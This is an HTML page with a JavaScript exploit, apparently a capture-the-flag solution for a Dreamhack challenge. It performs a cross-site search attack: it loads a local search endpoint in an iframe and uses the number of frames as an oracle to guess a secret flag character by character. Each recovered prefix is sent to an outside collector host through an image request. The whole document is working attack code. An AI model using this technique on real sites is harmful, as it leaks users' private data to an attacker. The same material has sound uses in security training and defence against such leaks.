<!DOCTYPE html>
<html>

<body>
	<iframe></iframe>
	<img></img>
	<script>
		const cand = "0123456789abcdef}";
		const iframe = document.querySelector("iframe");
		const img = document.querySelector("img");

		async function testURL(url) {
		  return new Promise((resolve, reject) => {
			  iframe.src = url;
  			iframe.onload = () => { 
  				if (iframe.contentWindow.frames.length != 0)
  					return resolve();
  				else
  					return reject();
  			};
		  });
		}
    
		async function exploit() {
		  let flag = "DH{";
		  while(!flag.includes("}")){
			  for (const c of cand) {
          const q = flag + c;
          try{
            await testURL(`http://localhost:8000/search?query=${q}`);
            flag += c;
				    img.src = "https://qedetly.request.dreamhack.games/" + flag;
          } catch(e){;}
			  }
      }
		}
		exploit();
	  </script>
	</body>

</html>
